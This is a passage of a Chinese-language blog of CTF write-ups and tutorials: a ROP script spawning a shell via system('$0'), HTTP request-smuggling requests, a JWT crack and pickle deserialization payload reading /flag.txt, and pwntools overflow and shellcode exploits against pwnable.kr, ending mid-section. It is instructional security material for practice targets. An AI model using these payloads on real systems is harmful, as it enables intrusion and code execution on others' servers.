<p>但是system函数里面的字符串并不是我们想要的<code>&#39;/bin/sh&#39;</code>,尝试用ROPgadget去搜索，命令为<code>ROPgadget --binary pwn4 --string &#39;/bin/sh&#39;</code>，搜索无果。。。再回到IDA中检测字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data:0000000000601100	00000022	C	4985y9y()DY)*YFG8yas08d976s08d7$0</span><br></pre></td></tr></table></figure>

<ul>
<li><p>发现了一个<code>$0</code>，<code>$0</code>在linux中为为shell或shell脚本的名称。<br><code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/sh -c string</code>来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将<code>$0</code>作为<code>system</code>的参数，能达到传入<code>&#39;/bin/sh&#39;</code>一样的效果。</p>
</li>
<li><p>有了<code>system</code>函数和<code>$0</code>作为参数，就可以进行溢出了。</p>
</li>
<li><p>还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p>
</li>
</ul>
<p>我们利用<code>ROPgadget</code>工具进行查找，得到<code>pop rdi ; ret</code>和<code>$0</code>的地址,system的地址直接在IDA中查看.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --only &apos;pop|ret&apos;</span><br><span class="line">ROPgadget --binary pwn4 --string &apos;\$0&apos;</span><br></pre></td></tr></table></figure>

<p>首先先填充缓冲区，大小为0x10，然后覆盖rbp，8个字节，传入pop rdi;ret的地址和$0,将栈中$0的地址弹出，存入rdi作为参数，在传入system地址进行调用。<br>下面是脚本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">conn = remote(&apos;114.116.54.89&apos;, 10004)</span><br><span class="line"># conn = process(&apos;./pwn4&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x00000000004007d3 </span><br><span class="line">bin_sh = 0x000000000060111f</span><br><span class="line">system = 0x000000000040075A</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos; * (0x10+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)  </span><br><span class="line"></span><br><span class="line">conn.recvuntil(&apos;Come on,try to pwn me&apos;)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>http-smuggle</title>
    <url>/2019/12/25/http-smuggle/</url>
    <content><![CDATA[<h1 id="协议层攻击之HTTP请求走私"><a href="#协议层攻击之HTTP请求走私" class="headerlink" title="协议层攻击之HTTP请求走私"></a>协议层攻击之HTTP请求走私</h1><a id="more"></a>
<h2 id="0x01-HTTP请求走私是什么"><a href="#0x01-HTTP请求走私是什么" class="headerlink" title="0x01 HTTP请求走私是什么"></a>0x01 HTTP请求走私是什么</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
<h2 id="0x02-为什么会产生HTTP请求走私"><a href="#0x02-为什么会产生HTTP请求走私" class="headerlink" title="0x02 为什么会产生HTTP请求走私"></a>0x02 为什么会产生HTTP请求走私</h2><ul>
<li>请求走私漏洞成因<br>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。<br>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br>同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</li>
<li>RFC2616规范<br>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。<br>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个chain中时，它将会回退到使用<code>Content-Length</code>去发送请求。</li>
<li>走私攻击实现<br>当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</li>
</ul>
<h2 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h2><p>HTTP请求走私攻击涉及将Content-Length标头和Transfer-Encoding标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
<ul>
<li><p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。</p>
</li>
<li><p>TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。</p>
</li>
<li><p>TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p>
<h2 id="0x04-HTTP请求走私攻击的五种方式"><a href="#0x04-HTTP请求走私攻击的五种方式" class="headerlink" title="0x04 HTTP请求走私攻击的五种方式"></a>0x04 HTTP请求走私攻击的五种方式</h2><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br>前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。</p>
</li>
<li><p>构造请求示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程<br>前端服务器收到该请求，读取Content-Length，判断这是一个完整的请求。<br>然后转发给后端服务器，后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，后端服务器就认为这是收到了两个请求，分别是：<br>第一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>第二个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

<p>所以造成了请求走私。</p>
<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><ul>
<li><p>RFC7230规范:在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。<br>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br>但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p>
</li>
<li><p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程：中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br>而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。<br>如果此时有一个其他的正常用户对服务器进行了请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母a的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure>

<p>这时，用户就会收到一个类似于aGET request method not found的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p>
<p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br>所以想到前面所说的.</p>
<ul>
<li>RFC2616规范:如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。<br>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守RFC2616的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</li>
<li>chunk传输数据(size的值由16进制表示)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>连续发送几次请求就可以获得响应。</p>
<ul>
<li>攻击流程：<br>由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>认为已经读取到结尾了。<br>但剩下的字母a就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p>
<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding请求头，后端服务器处理Content-Length请求头。</p>
<ul>
<li><p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程：前端服务器处理Transfer-Encoding，当其读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>认为是读取完毕了。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，因为请求体的长度为4.也就是当它读取完:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure>

<p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错，造成HTTP请求走私。</p>
<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理Transfer-Encoding请求头。在某种意义上这还是CL-TE或者TE-CL。</p>
<ul>
<li><p>构造请求示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击流程：<br>前端服务器处理Transfer-Encoding，当其读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>认为是读取结束。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理Transfer-encoding请求头，将Transfer-Encoding隐藏在服务端的一个chain中时，它将会回退到使用Content-Length去发送请求。读取到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5c\r\n</span><br></pre></td></tr></table></figure>

<p>认为是读取完毕了。后面的数据就认为是另一个请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错，造成HTTP请求走私。</p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>1、将前端服务器配置为只使用HTTP/2与后端系统通信<br>2、完全禁用后端连接重用来解决此漏洞的所有变体<br>3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。<br>4、彻底拒绝模糊的请求，并删除关联的连接。<br>5、在Burp Suite中，你可以使用Repeater菜单禁用此行为，确保你选择的工具具有相同的功能。<br>6、通过Squid之类的代理来测试他们的测试人员的流量以进行监控。破坏测试人员发起的任何走私攻击请求，确保对此漏洞做到全面杜绝。</p>
<h4 id="author-Horizon"><a href="#author-Horizon" class="headerlink" title="author:Horizon"></a>author:Horizon</h4>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2019/12/25/jwt/</url>
    <content><![CDATA[<h1 id="jwt基础知识"><a href="#jwt基础知识" class="headerlink" title="jwt基础知识"></a>jwt基础知识</h1><a id="more"></a>
<h2 id="JSON-web-token是什么"><a href="#JSON-web-token是什么" class="headerlink" title="JSON web token是什么"></a>JSON web token是什么</h2><ul>
<li>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。<h2 id="什么时候你应该用JSON-Web-Tokens"><a href="#什么时候你应该用JSON-Web-Tokens" class="headerlink" title="什么时候你应该用JSON Web Tokens"></a>什么时候你应该用JSON Web Tokens</h2>下列场景中使用JSON Web Token是很有用的：</li>
<li>Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
<li>Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。<h2 id="JSON-Web-Token的结构是什么样的"><a href="#JSON-Web-Token的结构是什么样的" class="headerlink" title="JSON Web Token的结构是什么样的"></a>JSON Web Token的结构是什么样的</h2></li>
<li>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：1.Header</li>
</ul>
<p>2.Payload<br>3.Signature.</p>
<ul>
<li>因此，一个典型的JWT看起来是这个样子的：<code>xxxxx.yyyyy.zzzzz</code><br>接下来看一下每一部分:</li>
<li>header<br>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。<br>例如：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>然后，用Base64对这个JSON编码就得到JWT的第一部分.</p>
<ul>
<li>Payload<br>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</li>
</ul>
<p>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。<br>Public claims : 可以随意定义。<br>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。<br>下面是一个例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;sub&quot;:&quot;1234567890&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;John Doe&quot;,</span><br><span class="line">    &quot;admin&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对payload进行Base64编码就得到JWT的第二部分</p>
<p>注意，不要在JWT的payload或header中放置敏感信息，除非他们是加密的.</p>
<ul>
<li>Signature<br>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="BUUCTF-ikun"><a href="#BUUCTF-ikun" class="headerlink" title="BUUCTF ikun"></a>BUUCTF ikun</h1><ul>
<li>第一步提示我们要找到lv6<br>写个脚本找一下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://web44.buuoj.cn/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,2000):</span><br><span class="line"></span><br><span class="line">	r=requests.get(url+str(i))</span><br><span class="line">	if &apos;lv6.png&apos; in r.text:</span><br><span class="line">		print (i)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>跑的有点慢,找到了lv6发现买不起.应该是要抓包修改折扣.然后拿到后台的地址.<br>但需要权限，这里涉及JWT破解,先将JWT base64解码一下,看到username是我自己的登陆名5，这里需要改为admin<br>后边解码不出来因为经过了sha256，需要破解key<br>找了一个工具破的破解工具c-jwt-cracker,爆破密码1Kun.<br>登录之后有一个<a href="http://www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个" target="_blank" rel="noopener">www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个</a><br>p=pickle.loads(urllib.unquote(become))<br>用py2跑<br>py3序列化pickle.dumps之后的结果和py2的不一样<br>怀疑是库的问题</p>
<p>这里用了Pickle协议的方法<strong>reduce</strong>(self)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>

<p>这样就可以打印flag.txt里的内容了<br>将生成的payload传给become<br>拿到flag.</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr</title>
    <url>/2019/12/25/pwnable.kr/</url>
    <content><![CDATA[<h1 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h1><a id="more"></a>
<ul>
<li>一个pwn平台.别问我为什么换方向了.刷题记录.<br>雄关漫道真如铁,而今迈步从头越.<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1></li>
<li>我们首先看到这道题的C源码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">        if(argc&lt;2)&#123;</span><br><span class="line">                printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">        int len = 0;</span><br><span class="line">        len = read(fd, buf, 32);</span><br><span class="line">        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">                printf(&quot;good job :)\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>需要得到flag，则需要执行:<code>system(&quot;/bin/cat flag&quot;);</code><br>则 必须 buf = “LETMEWIN”。<br>read(fd, buf, 32)函数中的三个参数中：</p>
<ul>
<li>fd == 0时：则表示标准输入；</li>
<li>fd == 1时：则表示 标准输出；</li>
<li>fd == 2时，则表示标准输出错误。<br>buf 表示读入的缓冲区；<br>32表示读入32字节；<br>所以我们 只需要 使 fd == 0 ，则我们就能自己输入 LETMEWIN 到 buf中。这样最终得到flag。<br>那么我们就要令<code>argv[1] = 0x1234</code>即 <code>argv[1] = 4660</code>.</li>
</ul>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwntools</title>
    <url>/2019/12/25/pwntools/</url>
    <content><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><ul>
<li><p>pwntools是一个二进制利用框架。(别问我为什么转pwn,web打不下去了好吧)可以方便有效的帮助我们编写exp。</p>
<a id="more"></a>
<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2></li>
<li><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">    char overflowme[32];</span><br><span class="line">    printf(&quot;overflow me : &quot;);</span><br><span class="line">    gets(overflowme);    // smash me!</span><br><span class="line">    if(key == 0xcafebabe)&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        printf(&quot;Nah..\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    func(0xdeadbeef);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>pwntools脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;pwnable.kr&quot;, 9000)</span><br><span class="line">c.sendline(&quot;AAAA&quot; * 13 + p32(0xcafebabe))</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>源码简洁明了，我们只需要将key改写成0xcafebabe。</p>
<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code>会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 c). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
<ul>
<li><code>send(payload)</code> 发送payload</li>
<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾\n）</li>
<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
<li><code>recvline()</code> 接收一行输出</li>
<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
<li><code>recvuntil(some_string)</code> 接收到 some_string 为止<br>在第三行中,<code>p32()</code>可以让我们转换整数到小端序格式. <code>p32</code>转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到key的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。<h2 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h2>下一题是pwnable.kr的asm. 你需要用 ssh -p2222 <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> 并输入密码 guest 来查看可执行文件和源码. 这里，我们只展示利用代码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./asm&quot;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"> </span><br><span class="line">shellcode = shellcraft.amd64.pushstr(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.amd64.linux.open(&apos;rsp&apos;,0,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.read(&apos;rax&apos;,&apos;rsp&apos;,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.write(1, &apos;rsp&apos;, 100)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&apos;shellcode: &apos;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">log.success(p.recvall())</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br>提醒一下，如果你想在命令行中使用<code>gdb.attach()</code>, 便需要安装并运行 tmux.<br><code>process</code> 和 <code>remote</code> 类似. remote 连接远程主机, process 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).<br>shellcraft 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 open 了一个文件并 read 文件到 stdout.</p>
<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
